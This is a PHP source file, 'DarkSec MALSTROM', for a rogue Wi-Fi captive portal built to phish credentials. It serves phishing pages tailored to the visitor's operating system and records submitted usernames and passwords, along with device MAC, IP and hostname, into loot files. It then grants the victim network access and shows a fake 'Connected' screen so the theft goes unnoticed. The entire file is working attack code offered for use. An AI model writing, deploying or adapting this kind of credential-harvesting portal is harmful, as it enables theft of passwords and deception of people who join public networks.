<?php
/**
 * DarkSec MALSTROM — captive portal credential handler.
 *
 * Serves OS-adaptive phishing templates and captures submitted credentials.
 * Two responsibilities:
 *   GET  /captiveportal/index.php  ->  detect device, render the matching
 *                                      template with placeholders injected.
 *   POST /captiveportal/index.php  ->  capture creds, whitelist the client,
 *                                      render the "Connected" success page.
 *
 * Captured credentials are written to:
 *   /tmp/malstrom/creds.json        (machine-readable, streamed to dashboard)
 *   /tmp/malstrom/creds.log         (plain text mirror)
 * The payload's monitor copies these into /root/loot/malstrom/.
 *
 * Paths are resolved relative to the deployed script so php-fpm's cleared
 * environment can't break rendering; the SSID is read from /tmp/malstrom.
 */

// --- Configuration -------------------------------------------------------------
$STATE_DIR      = '/tmp/malstrom';
$SCRIPT_DIR     = __DIR__;                       // .../www_portal or .../www_portal/captiveportal

/** Walk up from SCRIPT_DIR until a portal/templates directory is found. */
function locate_templates_dir($start) {
    $dir = $start;
    while (strlen($dir) > 1) {
        $cand = rtrim($dir, '/') . '/portal/templates';
        if (is_dir($cand)) return realpath($cand);
        $dir = dirname($dir);
    }
    return $start;
}
$TEMPLATE_DIR   = locate_templates_dir($SCRIPT_DIR);
$WHITELIST_FILE = $STATE_DIR . '/whitelist.txt';
$CREDS_JSON     = $STATE_DIR . '/creds.json';
$CREDS_LOG      = $STATE_DIR . '/creds.log';
$PORTAL_IP      = '172.16.52.1';
$REDIRECT_TARGET = 'http://example.com';

// SSID is refreshed by engine.py on clone apply / state writes.
$SSID = '';
if (is_file($STATE_DIR . '/current_ssid')) {
    $SSID = trim(@file_get_contents($STATE_DIR . '/current_ssid'));
}

/** Runtime default template — written by engine.py/api.sh when the dashboard switches it. */
function default_template() {
    global $STATE_DIR;
    $t = @file_get_contents($STATE_DIR . '/template_default');
    $t = trim($t);
    return ($t !== '') ? $t : 'wifi_login';
}

/**
 * Best-effort OS detection from the User-Agent string.
 * Falls back through the env-provided default template.
 */
function detect_os() {
    $ua = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
    if (stripos($ua, 'Windows')  !== false) return 'windows';
    if (stripos($ua, 'Android')  !== false) return 'android';
    if (stripos($ua, 'iPhone')   !== false) return 'ios';
    if (stripos($ua, 'iPad')     !== false) return 'ios';
    if (stripos($ua, 'Mac OS')   !== false) return 'windows'; // closest visual match available
    if (stripos($ua, 'CriOS')    !== false) return 'ios';
    return '';
}

/** Render a template with MALSTROM placeholders replaced. */
function render_template($template) {
    global $TEMPLATE_DIR, $SSID, $REDIRECT_TARGET;
    $file = rtrim($TEMPLATE_DIR, '/') . '/' . $template . '.html';
    if (!is_file($file)) {
        $file = rtrim($TEMPLATE_DIR, '/') . '/' . default_template() . '.html';
    }
    $html = @file_get_contents($file);
    if ($html === false) {
        $html = "<html><body style='font-family:sans-serif;background:#111;color:#eee;padding:40px'><h2>Welcome to $SSID</h2><p>Please sign in to continue.</p></body></html>";
    }
    return str_replace(
        array('__MALSTROM_SSID__',   '__MALSTROM_TARGET__'),
        array(htmlspecialchars($SSID, ENT_QUOTES, 'UTF-8'), htmlspecialchars($REDIRECT_TARGET, ENT_QUOTES, 'UTF-8')),
        $html
    );
}

/** Log a captured credential to JSON-lines + text mirror. */
function log_creds($entry) {
    global $CREDS_JSON, $CREDS_LOG, $LOOT_SYNC;
    // JSON Lines — one object per line, dashboard/db friendly.
    $json = json_encode($entry);
    @file_put_contents($CREDS_JSON, $json . "\n", FILE_APPEND | LOCK_EX);

    // Plain text mirror.
    $text = "[" . $entry['ts'] . "]\n" .
            "  Template:   {$entry['template']}\n" .
            "  Device:     {$entry['device']}\n" .
            "  Username:   {$entry['username']}\n" .
            "  Password:   {$entry['password']}\n" .
            "  Hostname:   {$entry['hostname']}\n" .
            "  MAC:        {$entry['mac']}\n" .
            "  IP:         {$entry['ip']}\n" .
            "  UserAgent:  {$entry['ua']}\n" .
            str_repeat('-', 46) . "\n\n";
    @file_put_contents($CREDS_LOG, $text, FILE_APPEND | LOCK_EX);
}

/** Add client IP to the whitelist file (monitor applies nft bypass). */
function whitelist_ip($ip) {
    global $WHITELIST_FILE;
    if (!preg_match('/^([0-9]{1,3}\.){3}[0-9]{1,3}$/', $ip)) return;
    $entries = @file($WHITELIST_FILE, FILE_IGNORE_NEW_LINES) ?: array();
    if (in_array($ip, $entries)) return;
    @file_put_contents($WHITELIST_FILE, $ip . "\n", FILE_APPEND | LOCK_EX);
}

/** Success page shown after credentials are accepted. */
function render_success() {
    global $REDIRECT_TARGET;
    $target = json_encode($REDIRECT_TARGET);
    header('Content-Type: text/html; charset=utf-8');
    echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<title>Connected</title><style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Arial,sans-serif;background:#0c1118;color:#e7ebf2;min-height:100vh;display:flex;align-items:center;justify-content:center}
.card{text-align:center;max-width:400px;padding:30px}
.spin{width:56px;height:56px;margin:0 auto 24px;border:4px solid rgba(63,140,255,.2);border-top-color:#3f8cff;border-radius:50%;animation:s 1s linear infinite}
@keyframes s{to{transform:rotate(360deg)}}
h1{font-size:20px;margin-bottom:8px}
p{color:#94a3b8;font-size:14px;min-height:20px}
.bar{height:5px;background:#1c2431;border-radius:4px;margin-top:22px;overflow:hidden}
.fill{height:100%;width:0;background:#3f8cff;border-radius:4px;transition:width .3s}
</style></head><body>
<div class="card"><div class="spin"></div><h1>Connected</h1><p id="s">Securing your connection…</p><div class="bar"><div class="fill" id="f"></div></div></div>
<script>
var t=' . $target . ',star=Date.now(),f=document.getElementById("f"),s=document.getElementById("s"),
 msgs=["Verifying credentials…","Configuring network…","Establishing secure session…","Finalizing connection…"];
setInterval(function(){var e=Date.now()-star;f.style.width=Math.min(95,100*(1-Math.exp(-e/30000)))+"%";s.textContent=msgs[Math.floor(e/6000)%msgs.length];},200);
function go(){var im=new Image();im.onload=function(){f.style.width="100%";setTimeout(function(){location.href=t;},400);};im.onerror=function(){setTimeout(go,2000);};im.src="http://www.example.com/favicon.ico?"+Date.now();}
setTimeout(go,1200);
</script></body></html>';
    exit;
}

// ----------------------------------------------------------------------------
// Request handling
// ----------------------------------------------------------------------------
@mkdir($STATE_DIR, 0755, true);

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = isset($_POST['username']) ? trim($_POST['username']) : (isset($_POST['email']) ? trim($_POST['email']) : '');
    $password = isset($_POST['password']) ? trim($_POST['password']) : '';
    $hostname = isset($_POST['hostname']) ? trim($_POST['hostname']) : '';
    $mac      = isset($_POST['mac'])      ? trim($_POST['mac'])      : '';
    $ip       = isset($_POST['ip'])       ? trim($_POST['ip'])       : '';

    if ($username === '' && $password === '') {
        render_success(); // empty post: don't record, just keep the show going
    }

    $entry = array(
        'ts'       => gmdate('Y-m-d H:i:s') . ' UTC',
        'template' => '',      // filled below
        'device'   => detect_os(),
        'username' => $username,
        'password' => $password,
        'hostname' => $hostname,
        'mac'      => $mac,
        'ip'       => $ip,
        'ua'       => isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '',
    );

    // Determine template: the portal always renders OS-adaptive pages; record
    // which template would match this client so we can visualise attack spread.
    $os = detect_os();
    $entry['template'] = $os !== '' ? $os : default_template();

    log_creds($entry);
    whitelist_ip($ip !== '' ? $ip : (isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : ''));
    render_success();
}

// --- GET: serve the OS-adaptive template -------------------------------------
$os = detect_os();
$template = ($os !== '') ? $os : default_template();
header('Content-Type: text/html; charset=utf-8');
echo render_template($template);
exit;